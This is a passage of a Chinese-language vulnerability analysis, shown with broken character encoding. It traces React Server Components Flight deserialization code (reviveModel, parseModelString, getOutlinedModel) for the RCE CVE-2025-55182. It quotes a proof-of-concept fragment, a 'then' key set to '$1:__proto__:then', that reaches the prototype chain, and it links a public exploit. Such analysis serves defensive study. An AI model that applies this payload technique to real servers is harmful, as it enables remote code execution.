 * åˆå§‹åŒ–æ¨¡å‹å—ï¼ˆModel Chunkï¼‰çš„æ ¸å¿ƒæ³›å‹å‡½æ•°ï¼Œæ ¸å¿ƒä½œç”¨ï¼š
 * 1. å®‰å…¨åˆå§‹åŒ–æ¨¡å‹å—ï¼ˆæš‚å­˜/æ¢å¤å…¨å±€çŠ¶æ€ï¼Œé¿å…å¹¶å‘å†²çªï¼‰ï¼›
 * 2. å…ˆæ ‡è®°ä¸ºCYCLICçŠ¶æ€é˜²æ­¢å¾ªç¯å¼•ç”¨å¯¼è‡´çš„é‡å¤åˆå§‹åŒ–ï¼›
 * 3. è§£æJSONåºåˆ—åŒ–æ•°æ®ï¼Œé€šè¿‡reviveModelè¿˜åŸä¸ºå¸¦ç±»å‹çš„ç»„ä»¶æ¨¡å‹ï¼›
 * 4. æ ¹æ®ä¾èµ–çŠ¶æ€æ ‡è®°ä¸ºBLOCKEDï¼ˆé˜»å¡ï¼‰/INITIALIZEDï¼ˆå·²åˆå§‹åŒ–ï¼‰ï¼Œå¼‚å¸¸æ—¶æ ‡è®°ä¸ºERROREDï¼›
 * 5. æ˜¯ Flight åè®®ååºåˆ—åŒ–ä¸­ã€ŒåŸå§‹æ•°æ® â†’ ç»„ä»¶æ¨¡å‹ã€çš„æ ¸å¿ƒè½¬æ¢ç¯èŠ‚ã€‚
 * 
 * @template T - æ¨¡å‹å—å­˜å‚¨çš„æ•°æ®ç±»å‹ï¼ˆæ³›å‹é€‚é…ç»„ä»¶/è¡¨å•/æµå¼æ•°æ®ç­‰ä¸åŒåœºæ™¯ï¼‰
 * @param {ResolvedModelChunk&lt;T&gt;} chunk - å·²è§£ææ ‡è®°çš„æ¨¡å‹å—ï¼ˆå«åºåˆ—åŒ–JSONæ•°æ®ã€å“åº”ä¸Šä¸‹æ–‡ç­‰ï¼‰
 * @returns {void} - æ— è¿”å›å€¼ï¼Œç›´æ¥ä¿®æ”¹æ¨¡å‹å—çš„çŠ¶æ€ã€å€¼ã€åŸå› ç­‰æ ¸å¿ƒå±æ€§
 */
function initializeModelChunk&lt;T&gt;(chunk: ResolvedModelChunk&lt;T&gt;): void {
  // ========== æ­¥éª¤1ï¼šæš‚å­˜å…¨å±€åˆå§‹åŒ–çŠ¶æ€ï¼Œé¿å…å¹¶å‘å†²çª ==========
  const prevChunk = initializingChunk;
  const prevBlocked = initializingChunkBlockedModel;
  initializingChunk = chunk;
  initializingChunkBlockedModel = null;

  // ========== æ­¥éª¤2ï¼šå¤„ç†æ ¹å¼•ç”¨æ ‡è¯†ï¼Œæå–åºåˆ—åŒ–æ¨¡å‹æ•°æ® ==========
  const rootReference =
    chunk.reason === -1 ? undefined : chunk.reason.toString(16);
  // æå–æ¨¡å‹å—ä¸­å­˜å‚¨çš„åŸå§‹JSONåºåˆ—åŒ–æ•°æ®
  const resolvedModel = chunk.value;

  // ========== æ­¥éª¤3ï¼šåˆå§‹çŠ¶æ€æ ‡è®°ä¸ºCYCLICï¼Œé˜²æ­¢å¾ªç¯å¼•ç”¨é‡å¤åˆå§‹åŒ– ==========
  const cyclicChunk: CyclicChunk&lt;T&gt; = (chunk: any);
  cyclicChunk.status = CYCLIC;    
  cyclicChunk.value = null;       
  cyclicChunk.reason = null;      

  try {
    // ========== æ­¥éª¤4ï¼šè§£æJSONå¹¶è¿˜åŸä¸ºå¸¦ç±»å‹çš„ç»„ä»¶æ¨¡å‹ ==========
    // 1. JSON è§£æï¼Œå°†åºåˆ—åŒ–çš„JSONå­—ç¬¦ä¸²è§£æä¸ºåŸå§‹JSå¯¹è±¡
    const rawModel = JSON.parse(resolvedModel);
    // 2. Flightååºåˆ—åŒ–æ ¸å¿ƒï¼šé€šè¿‡reviveModelé€’å½’è¿˜åŸæ¨¡å‹ï¼Œå°†JSONè½¬æ¢ä¸ºRSCç»„ä»¶æ¨¡å‹
    const value: T = reviveModel(
      chunk._response,
      {&#39;&#39;: rawModel},
      &#39;&#39;,
      rawModel,
      rootReference
    );

    // ========== æ­¥éª¤5ï¼šæ ¹æ®ä¾èµ–çŠ¶æ€æ ‡è®°æ¨¡å‹å—æœ€ç»ˆçŠ¶æ€ ==========
    if (
      initializingChunkBlockedModel !== null &amp;&amp;
      initializingChunkBlockedModel.deps &gt; 0
    ) {
      // åˆ†æ”¯1ï¼šå­˜åœ¨æœªè§£æçš„æ¨¡å—ä¾èµ– â†’ æ ‡è®°ä¸ºBLOCKEDï¼ˆé˜»å¡ï¼‰çŠ¶æ€
    } else {
      // åˆ†æ”¯2ï¼šæ— æœªè§£æä¾èµ– â†’ æ ‡è®°ä¸ºINITIALIZEDï¼ˆå·²åˆå§‹åŒ–ï¼‰çŠ¶æ€
    }
  } catch (error) {
    // ========== æ­¥éª¤6ï¼šæ•è·è§£æ/è¿˜åŸå¼‚å¸¸ï¼Œæ ‡è®°ä¸ºERROREDï¼ˆé”™è¯¯ï¼‰çŠ¶æ€ ==========
  } finally {
    // ========== æ­¥éª¤7ï¼šæ¢å¤å…¨å±€åˆå§‹åŒ–çŠ¶æ€ï¼Œä¿è¯å¹¶å‘å®‰å…¨ ==========
    initializingChunk = prevChunk;
    initializingChunkBlockedModel = prevBlocked;
  }
}
```

**å…³é”®æ­¥éª¤ï¼š**

- 1ã€Â å¯¹Â `chunk.value`Â è¿›è¡Œ JSON è§£æï¼Œå¾—åˆ°å¦‚Â `{then: &#34;$1:...&#34;, ...}`Â çš„å¯¹è±¡
- 2ã€`reviveModel`Â å¤„ç† JSONï¼Œå°†å­—ç¬¦ä¸²å¼•ç”¨è¿˜åŸä¸ºå®é™…å¯¹è±¡



**Flight åè®®ååºåˆ—åŒ–æ ¸å¿ƒï¼ˆ`reviveModel`ï¼‰**ï¼š

- `reviveModel` æ˜¯ Flight åè®®çš„æ ¸å¿ƒååºåˆ—åŒ–å‡½æ•°ï¼Œä½œç”¨æ˜¯å°†ã€ŒåŸå§‹ JSON å¯¹è±¡ã€è½¬æ¢ä¸ºã€ŒRSC å¯è¯†åˆ«çš„ç»„ä»¶æ¨¡å‹ã€ï¼›
- å…¶å‚æ•°åŒ…å« RSC å“åº”å¯¹è±¡ã€è§£æè·¯å¾„ã€æ ¹å¼•ç”¨æ ‡è¯†ï¼Œå¯å¤„ç†ç»„ä»¶å¼•ç”¨ã€æ¨¡å—ä¾èµ–ã€å¾ªç¯å¼•ç”¨ç­‰å¤æ‚åœºæ™¯ï¼Œæ˜¯ã€Œæ•°æ® â†’ ç»„ä»¶ã€çš„å…³é”®è½¬æ¢ã€‚

#### è¿˜åŸå¯¹è±¡ï¼šreviveModel

è¯¥å‡½æ•°æ˜¯  RSC Flight åè®®ä½“ç³»ä¸‹æ¨¡å‹æ•°æ®ååºåˆ—åŒ–çš„æ ¸å¿ƒé€’å½’å‡½æ•°ï¼Œæ˜¯ Flight åè®®å°†åºåˆ—åŒ–çš„ JSON æ•°æ®ï¼ˆå­—ç¬¦ä¸² / å¯¹è±¡ / æ•°ç»„ï¼‰è½¬æ¢ä¸ºå¯è¿è¡Œ RSC ç»„ä»¶æ¨¡å‹çš„æ ¸å¿ƒç¯èŠ‚ã€‚æ ¸å¿ƒåŠŸèƒ½å¯æ‹†è§£ä¸ºï¼š

1. **ç±»å‹åˆ†æ”¯å¤„ç†**ï¼šæ ¹æ®å€¼çš„ç±»å‹ï¼ˆå­—ç¬¦ä¸² / å¯¹è±¡ / æ•°ç»„ / åŸºç¡€ç±»å‹ï¼‰æ‰§è¡Œå·®å¼‚åŒ–è¿˜åŸé€»è¾‘ï¼›
2. **å­—ç¬¦ä¸²è§£æ**ï¼šè°ƒç”¨ `parseModelString` è§£æ Flight åè®®çº¦å®šçš„ç‰¹æ®Šæ ‡è®°å­—ç¬¦ä¸²ï¼ˆå¦‚ç»„ä»¶å¼•ç”¨ã€æ¨¡å—è·¯å¾„ã€ç‰¹æ®Šå€¼ç­‰ï¼‰ï¼Œè¿˜åŸä¸ºå¯¹åº” JS å®ä½“ï¼›
3. **å¯¹è±¡ / æ•°ç»„é€’å½’è¿˜åŸ**ï¼šéå†å¯¹è±¡ / æ•°ç»„çš„æ¯ä¸€ä¸ªå±æ€§ / å…ƒç´ ï¼Œé€’å½’å®Œæˆæ·±å±‚æ•°æ®è¿˜åŸï¼ŒåŒæ—¶ç»´æŠ¤ã€Œä¸´æ—¶å¼•ç”¨æ ‡è¯†ã€ï¼›
4. **ä¸´æ—¶å¼•ç”¨æ³¨å†Œ**ï¼šä¸ºå¯¹è±¡ç»‘å®š Flight åè®®çš„å¼•ç”¨æ ‡è¯†ï¼Œè§£å†³å¾ªç¯å¼•ç”¨ã€è·¨æ¨¡å‹å¼•ç”¨é—®é¢˜ï¼›
5. **æ— æ•ˆå±æ€§æ¸…ç†**ï¼šè¿˜åŸç»“æœä¸º `undefined` çš„å±æ€§ä¼šè¢«åˆ é™¤ï¼Œä¿è¯æ¨¡å‹æ•°æ®çš„åˆæ³•æ€§ï¼›

æ•´ä½“æ˜¯ Flight åè®®ååºåˆ—åŒ–ä¸­ã€Œæ‰å¹³åŒ– JSON æ•°æ® â†’ ç»“æ„åŒ–ç»„ä»¶æ¨¡å‹ã€çš„æ ¸å¿ƒé€’å½’é€»è¾‘ï¼Œæ”¯æ’‘ RSC ç»„ä»¶æ¨¡å‹çš„å®Œæ•´è¿˜åŸã€‚

```js
/**
 * Flight åè®®ï¼šæ¨¡å‹æ•°æ®ååºåˆ—åŒ–æ ¸å¿ƒé€’å½’å‡½æ•°ï¼Œæ ¸å¿ƒä½œç”¨ï¼š
 * 1. é€’å½’éå†åºåˆ—åŒ–çš„JSONæ•°æ®ï¼ŒæŒ‰Flightåè®®è§„åˆ™è¿˜åŸä¸ºå¯è¿è¡Œçš„RSCç»„ä»¶æ¨¡å‹ï¼›
 * 2. è§£æç‰¹æ®Šæ ‡è®°å­—ç¬¦ä¸²ï¼ˆ$å¼€å¤´ï¼‰ä¸ºå¯¹åº”JSå®ä½“ï¼ˆç»„ä»¶å¼•ç”¨ã€Dateã€TypedArrayç­‰ï¼‰ï¼›
 * 3. æ³¨å†Œä¸´æ—¶å¼•ç”¨æ ‡è¯†ï¼Œè§£å†³å¾ªç¯å¼•ç”¨/è·¨æ¨¡å‹å¼•ç”¨é—®é¢˜ï¼›
 * 4. æ¸…ç†è¿˜åŸå¤±è´¥çš„å±æ€§ï¼Œä¿è¯æ¨¡å‹æ•°æ®åˆæ³•æ€§ï¼›
 * 5. æ˜¯ Flight åè®®ååºåˆ—åŒ–ä¸­ã€ŒJSONæ•°æ® â†’ ç»„ä»¶æ¨¡å‹ã€çš„æ ¸å¿ƒé€’å½’é€»è¾‘ã€‚
 * 
 * @param {Response} response - RSC/Flightåè®®å“åº”å¯¹è±¡ï¼Œå«ä¸´æ—¶å¼•ç”¨ç¼“å­˜ç­‰æ ¸å¿ƒå±æ€§
 * @param {any} parentObj - å½“å‰å€¼çš„çˆ¶å¯¹è±¡/æ•°ç»„
 * @param {string} parentKey - å½“å‰å€¼åœ¨çˆ¶å¯¹è±¡/æ•°ç»„ä¸­çš„é”®/ç´¢å¼•
 * @param {JSONValue} value - å¾…è¿˜åŸçš„åŸå§‹JSONå€¼ï¼ˆå­—ç¬¦ä¸²/å¯¹è±¡/æ•°ç»„/æ•°å­—/å¸ƒå°”/nullï¼‰
 * @param {void | string} reference - å½“å‰å€¼çš„Flightåè®®å¼•ç”¨æ ‡è¯†
 * @returns {any} - è¿˜åŸåçš„æ¨¡å‹æ•°æ®ï¼ˆç»„ä»¶æ¨¡å‹/ç»“æ„åŒ–æ•°æ®/åŸºç¡€ç±»å‹ï¼‰
 */
function reviveModel(
  response: Response,
  parentObj: any,
  parentKey: string,
  value: JSONValue,
  reference: void | string,
): any {
  // ========== åˆ†æ”¯1ï¼šå­—ç¬¦ä¸²ç±»å‹ â†’ è§£æFlightåè®®ç‰¹æ®Šæ ‡è®°å­—ç¬¦ä¸² ==========
  if (typeof value === &#39;string&#39;) {
    // æ³¨é‡Šï¼šä¸èƒ½ç”¨.bindç»‘å®šthisï¼Œå› ä¸ºparseModelStringéœ€è¦å½“å‰ä¸Šä¸‹æ–‡çš„thiså€¼
    // æ ¸å¿ƒï¼šè°ƒç”¨parseModelStringè§£æ$å¼€å¤´çš„ç‰¹æ®Šå­—ç¬¦ä¸²ï¼ˆå¦‚$Fè¡¨ç¤ºæœåŠ¡ç«¯ç»„ä»¶å¼•ç”¨ï¼‰
    return parseModelString(response, parentObj, parentKey, value, reference);
  }

  // ========== åˆ†æ”¯2ï¼šéç©ºå¯¹è±¡/æ•°ç»„ç±»å‹ â†’ é€’å½’è¿˜åŸ &#43; å¼•ç”¨æ³¨å†Œ ==========
  if (typeof value === &#39;object&#39; &amp;&amp; value !== null) {
    // æ³¨å†Œä¸´æ—¶å¼•ç”¨ï¼šè‹¥å­˜åœ¨å¼•ç”¨æ ‡è¯†ä¸”å“åº”æœ‰ä¸´æ—¶å¼•ç”¨ç¼“å­˜ï¼Œç»‘å®šå¯¹è±¡ä¸å¼•ç”¨ï¼ˆè§£å†³å¾ªç¯å¼•ç”¨ï¼‰
    if (
      reference !== undefined &amp;&amp;
      response._temporaryReferences !== undefined
    ) {
      // å­˜å‚¨å¯¹è±¡çš„å¼•ç”¨æ ‡è¯†ï¼Œé˜²æ­¢åç»­è¿”å›æ—¶é‡å¤è§£æ
      registerTemporaryReference(
        response._temporaryReferences,
        value,
        reference
      );
    }

    // å­åˆ†æ”¯1ï¼šæ•°ç»„ç±»å‹ â†’ é€’å½’è¿˜åŸæ¯ä¸ªå…ƒç´ 
    if (Array.isArray(value)) {
      â€¦â€¦
    }
    // å­åˆ†æ”¯2ï¼šæ™®é€šå¯¹è±¡ç±»å‹ â†’ é€’å½’è¿˜åŸæ¯ä¸ªè‡ªæœ‰å±æ€§
    else {
      for (const key in value) {   // [3] éå†å¯¹è±¡å±æ€§  
        // ä»…å¤„ç†å¯¹è±¡è‡ªæœ‰å±æ€§ï¼ˆæ’é™¤åŸå‹é“¾å±æ€§ï¼Œé¿å…æ±¡æŸ“ï¼‰
        if (hasOwnProperty.call(value, key)) {
          // ç”Ÿæˆå­å±æ€§çš„å¼•ç”¨æ ‡è¯†ï¼šçˆ¶å¼•ç”¨ &#43; å±æ€§åï¼ˆè·³è¿‡å«&#34;:&#34;çš„ç‰¹æ®Šé”®ï¼‰
          const childRef =
            reference !== undefined &amp;&amp; key.indexOf(&#39;:&#39;) === -1
              ? reference &#43; &#39;:&#39; &#43; key
              : undefined;
          // é€’å½’è¿˜åŸå½“å‰å±æ€§å€¼
          const newValue = reviveModel(
            response,
            value,
            key,
            value[key],
            childRef
          );

          // å¤„ç†è¿˜åŸç»“æœï¼šæœ‰æ•ˆåˆ™èµ‹å€¼ï¼Œæ— æ•ˆåˆ™åˆ é™¤å±æ€§
          if (newValue !== undefined) {
            value[key] = newValue;  // ç”¨è§£æåçš„å¯¹è±¡æ›¿æ¢åŸå­—ç¬¦ä¸²  
          } else {
            // è¿˜åŸå¤±è´¥ï¼ˆè¿”å›undefinedï¼‰ï¼Œåˆ é™¤è¯¥å±æ€§ä¿è¯æ¨¡å‹æ•°æ®åˆæ³•æ€§
            delete value[key];
          }
        }
      }
    }
  }

  // ========== åˆ†æ”¯3ï¼šåŸºç¡€ç±»å‹ï¼ˆæ•°å­—/å¸ƒå°”/nullï¼‰â†’ ç›´æ¥è¿”å›åŸå€¼ ==========
  return value;
}
```



1. **é€’å½’è¿˜åŸçš„è®¾è®¡æ ¸å¿ƒ**ï¼šå‡½æ•°é‡‡ç”¨æ·±åº¦é€’å½’éå†å¯¹è±¡ / æ•°ç»„ï¼Œä¿è¯åµŒå¥—å±‚çº§çš„æ¨¡å‹æ•°æ®ï¼ˆå¦‚åµŒå¥—ç»„ä»¶ã€å¤šç»´æ•°ç»„ï¼‰éƒ½èƒ½è¢«å®Œæ•´è¿˜åŸ â€”â€” è¿™æ˜¯ Flight åè®®å¤„ç†å¤æ‚ç»„ä»¶æ¨¡å‹çš„åŸºç¡€ã€‚

2. **ä¸´æ—¶å¼•ç”¨çš„æ ¸å¿ƒä½œç”¨**ï¼š`registerTemporaryReference` å°†å¯¹è±¡ä¸ `reference` ç»‘å®šï¼Œå­˜å‚¨åœ¨ `response._temporaryReferences`ï¼ˆMap ç»“æ„ï¼‰ä¸­ï¼š

   - è§£å†³å¾ªç¯å¼•ç”¨ï¼šA å¼•ç”¨ Bã€B åˆå¼•ç”¨ A æ—¶ï¼Œèƒ½é€šè¿‡å¼•ç”¨æ ‡è¯†æ‰¾åˆ°å·²è¿˜åŸçš„å¯¹è±¡ï¼Œé¿å…æ­»å¾ªç¯ï¼›
   - è·¨æ¨¡å‹å¼•ç”¨ï¼šä¸åŒæ¨¡å‹å—ä¹‹é—´çš„å¯¹è±¡å¼•ç”¨ï¼Œèƒ½é€šè¿‡ç»Ÿä¸€çš„å¼•ç”¨æ ‡è¯†å…³è”ã€‚

3. **å¼•ç”¨æ ‡è¯†çš„ç”Ÿæˆè§„åˆ™**ï¼šå¼•ç”¨æ ‡è¯†æ ¼å¼ä¸º `çˆ¶å¼•ç”¨:å­é”®`ï¼ˆå¦‚ `123:0:title`ï¼‰ï¼Œå…¶ä¸­ï¼š

   - `123`ï¼šæ ¹æ¨¡å‹å— IDï¼›

   - `0`ï¼šæ•°ç»„ç´¢å¼•ï¼›

   - `title`ï¼šå¯¹è±¡å±æ€§åï¼›

     è·³è¿‡å« `:` çš„é”®ï¼Œé¿å…ä¸å¼•ç”¨æ ‡è¯†æ ¼å¼å†²çªã€‚

4. **æ— æ•ˆå±æ€§æ¸…ç†çš„æ„ä¹‰**ï¼šè¿˜åŸç»“æœä¸º `undefined` æ—¶åˆ é™¤å¯¹åº”å±æ€§ï¼Œé¿å…ï¼š

   - åŸå‹é“¾æ±¡æŸ“ï¼ˆå¦‚è¿˜åŸ `__proto__` å±æ€§å¤±è´¥æ—¶ç›´æ¥åˆ é™¤ï¼‰ï¼›
   - æ— æ•ˆæ•°æ®å¹²æ‰°ç»„ä»¶æ¸²æŸ“ï¼ˆå¦‚æœªè§£æçš„æ¨¡å—å¼•ç”¨ï¼‰ã€‚

5. **Flow æ³¨é‡Šçš„èƒŒæ™¯**ï¼š`$FlowFixMe[cannot-write]` æ˜¯ Facebook Flow ç±»å‹æ£€æŸ¥çš„å…¼å®¹æ³¨é‡Šï¼ŒåŸä»£ç ä¸­ç”¨äºå¿½ç•¥ã€Œä¿®æ”¹åªè¯»å¯¹è±¡ã€çš„ç±»å‹è­¦å‘Š â€”â€” å› ä¸º Flight åè®®å†…éƒ¨ç›´æ¥ä¿®æ”¹åºåˆ—åŒ–æ•°æ®ä»¥æå‡è§£ææ•ˆç‡ï¼Œè€Œéåˆ›å»ºæ–°å¯¹è±¡

```javascript
// packages/react-server/src/ReactFlightReplyServer.js  
function reviveModel(...): any {  
  ...  
  if (typeof value === &#39;object&#39; &amp;&amp; value !== null) {  
    ...  
    for (const key in value) {    // [3] éå†å¯¹è±¡å±æ€§  
      if (hasOwnProperty.call(value, key)) {  
        const newValue = reviveModel(  
          response, value, key, value[key], childRef,  
        );  
        if (newValue !== undefined) {  
          value[key] = newValue;  // ç”¨è§£æåçš„å¯¹è±¡æ›¿æ¢åŸå­—ç¬¦ä¸²  
        }  
      }  
    }  
  }  
  return value;  
}
```

POC ä¸­Â `chunk[0].value`Â ç» JSON è§£æåä¸º object ç±»å‹ï¼Œè¿›å…¥Â **\[3\]**Â å¤„çš„å¾ªç¯ï¼Œéå†æ‰€æœ‰ key-value å¹¶é€’å½’è°ƒç”¨Â `reviveModel`ã€‚è¿™æ˜¯ååºåˆ—åŒ–çš„æ ¸å¿ƒè¿‡ç¨‹â€”â€”å°†æ•°æ®è¿˜åŸä¸ºå®é™…å¯¹è±¡ã€‚

å½“é‡åˆ°ç¬¬ä¸€ä¸ª keyÂ `then`ï¼Œå…¶å€¼ä¸ºÂ `$1:__proto__:then`ï¼ˆå­—ç¬¦ä¸²ç±»å‹ï¼‰ï¼Œä¼šèµ°ä¸åŒåˆ†æ”¯ï¼š

```javascript
function reviveModel(...): any {  
  if (typeof value === &#39;string&#39;) {  
    return parseModelString(response, parentObj, parentKey, value, reference);  
  }  
  ...  
}
```



#### å­—ç¬¦ä¸²è§£æï¼šparseModelString

`parseModelString`Â åŒ…å«ä¸€ä¸ªå¤§å‹ switch è¡¨ï¼Œæ ¹æ®å‰ç¼€å­—ç¬¦è·¯ç”±åˆ°ä¸åŒå¤„ç†é€»è¾‘ï¼š

```javascript
// packages/react-server/src/ReactFlightReplyServer.js  
/**
 * Flight åè®®ï¼šè§£ææ¨¡å‹ç‰¹æ®Šæ ‡è®°å­—ç¬¦ä¸²çš„æ ¸å¿ƒå‡½æ•°ï¼Œæ ¸å¿ƒä½œç”¨ï¼š
 * 1. è§£æ Flight åè®®çº¦å®šçš„ä»¥ $ å¼€å¤´çš„ç‰¹æ®Šæ ‡è®°å­—ç¬¦ä¸²ï¼Œè½¬æ¢ä¸ºå¯¹åº” JS å®ä½“/åè®®å¯¹è±¡ï¼›
 * 2. æŒ‰äºŒçº§æ ‡è®°ï¼ˆ$ åç¬¬äºŒä¸ªå­—ç¬¦ï¼‰åˆ†æ”¯å¤„ç†ï¼Œè¦†ç›–åŸºç¡€ç±»å‹ã€é›†åˆç±»å‹ã€äºŒè¿›åˆ¶ç±»å‹ã€åè®®æ ¸å¿ƒç±»å‹ï¼›
 * 3. å®ç°æœåŠ¡ç«¯ç»„ä»¶å¼•ç”¨åŠ è½½ã€ä¸´æ—¶å¼•ç”¨åˆ›å»ºã€è¡¨å•æ•°æ®æå–ã€æµå¼æ•°æ®è§£æç­‰ Flight åè®®ä¸“å±é€»è¾‘ï¼›
 * 4. æ™®é€šå­—ç¬¦ä¸²ç›´æ¥è¿”å›ï¼Œæ˜¯ Flight åè®®ååºåˆ—åŒ–ä¸­ã€Œå­—ç¬¦ä¸² â†’ å®ä½“ã€çš„å…³é”®è½¬æ¢å±‚ã€‚
 * 
 * @param {Response} response - RSC/Flight åè®®å“åº”å¯¹è±¡ï¼ŒåŒ…å«_formDataï¼ˆè¡¨å•æ•°æ®ï¼‰ã€_prefixï¼ˆåè®®å‰ç¼€ï¼‰ã€ä¸´æ—¶å¼•ç”¨ç¼“å­˜ç­‰æ ¸å¿ƒå±æ€§
 * @param {Object} obj - å½“å‰å­—ç¬¦ä¸²æ‰€å±çš„çˆ¶å¯¹è±¡ï¼ˆç”¨äºå…³è”å±æ€§å½’å±ï¼‰
 * @param {string} key - å½“å‰å­—ç¬¦ä¸²åœ¨çˆ¶å¯¹è±¡ä¸­çš„å±æ€§é”®ï¼ˆå¦‚å¯¹è±¡å±æ€§åï¼‰
 * @param {string} value - å¾…è§£æçš„ Flight åè®®ç‰¹æ®Šæ ‡è®°å­—ç¬¦ä¸²ï¼ˆä»¥ $ å¼€å¤´ï¼‰
 * @param {void | string} reference - å½“å‰å­—ç¬¦ä¸²å¯¹åº”çš„ Flight åè®®å¼•ç”¨æ ‡è¯†
 * @returns {any} - è§£æåçš„ JS å®ä½“/åè®®å¯¹è±¡ï¼ˆå¦‚ FormDataã€Dateã€TypedArrayã€ç»„ä»¶å¼•ç”¨ç­‰ï¼‰ï¼Œæ™®é€šå­—ç¬¦ä¸²ç›´æ¥è¿”å›åŸå€¼
 */
function parseModelString(...): any { 
  // ========== æ ¸å¿ƒåˆ†æ”¯ï¼šä»…å¤„ç†ä»¥ $ å¼€å¤´çš„ Flight åè®®ç‰¹æ®Šæ ‡è®°å­—ç¬¦ä¸² ==========
  if (value[0] === &#39;$&#39;) {  
    // ========== ç¬¬ä¸€ç»„äºŒçº§æ ‡è®°è§£æï¼šåŸºç¡€ç±»å‹/åè®®æ ¸å¿ƒç±»å‹ ==========
    switch (value[1]) {  
      // æ ‡è®° $$ï¼šè½¬ä¹‰ $ å­—ç¬¦ â†’ ç§»é™¤ç¬¬ä¸€ä¸ª $ åè¿”å›
      case &#39;$&#39;: {  
        return value.slice(1);  
      }  
      // æ ‡è®° $@ï¼šPromise æ¨¡å‹å— â†’ è§£æ 16 è¿›åˆ¶ ID å¹¶è·å–å¯¹åº”æ¨¡å‹å—
      case &#39;@&#39;: {  
        // Promise å¼•ç”¨  
        const id = parseInt(value.slice(2), 16);  // æˆªå– $@ åå†…å®¹ï¼Œè½¬ä¸º 16 è¿›åˆ¶ ID
        const chunk = getChunk(response, id);     // [4] ä»å“åº”ä¸­è·å–è¯¥ ID å¯¹åº”çš„æ¨¡å‹å—
        return chunk;  
      }  
      ...  
    }  
    // ========== å…œåº•å¤„ç†ï¼šæœªåŒ¹é…äºŒçº§æ ‡è®°çš„ç‰¹æ®Šå­—ç¬¦ä¸² ==========
    // é»˜è®¤ï¼šchunk å¼•ç”¨ï¼Œç§»é™¤å¼€å¤´çš„ $
    const ref = value.slice(1);  
    // è§£æä¸ºé€šç”¨æ¨¡å‹ï¼ˆOutlined Modelï¼‰
    return getOutlinedModel(response, ref, obj, key, createModel);  // [5]  
  }  
}
```

è¯¥å‡½æ•°æ˜¯ **RSC Flight åè®®ä½“ç³»ä¸‹è§£ææ¨¡å‹ç‰¹æ®Šæ ‡è®°å­—ç¬¦ä¸²çš„æ ¸å¿ƒå‡½æ•°**ï¼Œæ˜¯ Flight åè®®ååºåˆ—åŒ–ä¸­ã€Œ`$` å¼€å¤´çš„åè®®æ ‡è®°å­—ç¬¦ä¸² â†’ å¯¹åº” JS å®ä½“ / ç»„ä»¶æ¨¡å‹ã€çš„å…³é”®è½¬æ¢å±‚ã€‚æ ¸å¿ƒåŠŸèƒ½å¯æ‹†è§£ä¸ºï¼š

1. **ç‰¹æ®Šå‰ç¼€è¯†åˆ«**ï¼šä»…å¤„ç†ä»¥ `$` å¼€å¤´çš„ Flight åè®®æ ‡è®°å­—ç¬¦ä¸²ï¼Œæ™®é€šå­—ç¬¦ä¸²ç›´æ¥è¿”å›ï¼›
2. äºŒçº§æ ‡è®°åˆ†æ”¯è§£æ
3. æŒ‰ `$` åçš„ç¬¬äºŒä¸ªå­—ç¬¦ï¼ˆå¦‚ `@/F/T/D` ç­‰ï¼‰ï¼Œå°†æ ‡è®°å­—ç¬¦ä¸²è§£æä¸ºå¯¹åº”ç±»å‹çš„ JS å®ä½“ï¼š
   åŸºç¡€ç±»å‹ï¼šInfinityã€-0ã€-Infinityã€NaNã€undefinedã€Dateã€BigIntï¼›
   é›†åˆç±»å‹ï¼šMapã€Setã€FormDataã€Iteratorï¼›
   äºŒè¿›åˆ¶ / æ•°ç»„ç±»å‹ï¼šå„ç±» TypedArrayï¼ˆInt8Array/Uint8Array ç­‰ï¼‰ã€ArrayBufferã€DataViewã€Blobï¼›
   åè®®æ ¸å¿ƒç±»å‹ï¼šPromise æ¨¡å‹å—ã€æœåŠ¡ç«¯ç»„ä»¶å¼•ç”¨ã€ä¸´æ—¶å¼•ç”¨ã€å¯è¯»æµï¼ˆReadableStreamï¼‰ã€å¼‚æ­¥å¯è¿­ä»£å¯¹è±¡ï¼›
4. å…œåº•å¤„ç†ï¼šæœªåŒ¹é…äºŒçº§æ ‡è®°çš„ç‰¹æ®Šå­—ç¬¦ä¸²ï¼Œè§£æä¸ºé€šç”¨æ¨¡å‹å¼•ç”¨ï¼›

æ•´ä½“è¦†ç›–äº† Flight åè®®çº¦å®šçš„æ‰€æœ‰ç‰¹æ®Šå­—ç¬¦ä¸²ç±»å‹ï¼Œæ˜¯ã€Œåºåˆ—åŒ–æ ‡è®°å­—ç¬¦ä¸² â†’ å¯è¿è¡Œ JS å®ä½“ã€çš„æ ¸å¿ƒè§£æå™¨ï¼Œæ”¯æ’‘ RSC ç»„ä»¶æ¨¡å‹çš„å®Œæ•´è¿˜åŸã€‚



#### å¼•ç”¨è§£æï¼šgetOutlinedModel

```javascript
// packages/react-server/src/ReactFlightReplyServer.js  
function getOutlinedModel&lt;T&gt;(...): T {  
  const path = reference.split(&#39;:&#39;);  // æŒ‰ : åˆ†å‰²è·¯å¾„  
  const id = parseInt(path[0], 16);  
  const chunk = getChunk(response, id);  
  ...  
  switch (chunk.status) {  
    ...  
    case PENDING:  
    case BLOCKED:  
    case CYCLIC:  
      const parentChunk = initializingChunk;  
      chunk.then(  // [6] æ³¨å†Œå›è°ƒ  
        createModelResolver(...),  
        createModelReject(parentChunk),  
      );  
      return (null: any);  
    default:  
      throw chunk.reason;  
  }  
}
```



## å‚è€ƒæ–‡çŒ®
- [ã€å®‰å…¨é€šå‘Šã€‘React Server Components RCEï¼ˆCVE-2025-55182ï¼‰](https://cloud.tencent.com/announce/detail/2179)
- [React æ¡†æ¶ CVE-2025-55182 RCE CVSS 10.0åˆ†æ](https://xz.aliyun.com/news/90754)
- [React æœåŠ¡å™¨ç»„ä»¶åŸå‹é“¾æ¼æ´ï¼ˆCVE-2025-55182ï¼‰](https://xz.aliyun.com/news/90753)
- [ã€æ¼æ´åˆ†æã€‘CVE-2025-55182 React2shellè¿œç¨‹ä»£ç æ‰§è¡Œè§£æ](https://keenlab.tencent.com/zh/2025/12/08/2025-CVE-2025-55182/)
- [POC for CVE-2025-55182 that works on Next.js 16.0.6](https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3)
- [CVE-2025-55182 Next.js Server Actions RCE Vulnerability Analysis](https://mp.weixin.qq.com/s/4RY6qo7Oww0Iny9GoxY5dw)
- [æºç å±‚é¢è¯¦è§£Node.jsååºåˆ—åŒ–æ¼æ´åŸç†ä¸åˆ©ç”¨](https://xz.aliyun.com/news/90764)

## æ–‡ä»¶å±æ€§

åˆ›å»ºæ—¶é—´ï¼š2025-12-05   17:41

ä¿®è®¢è®°å½•ï¼š
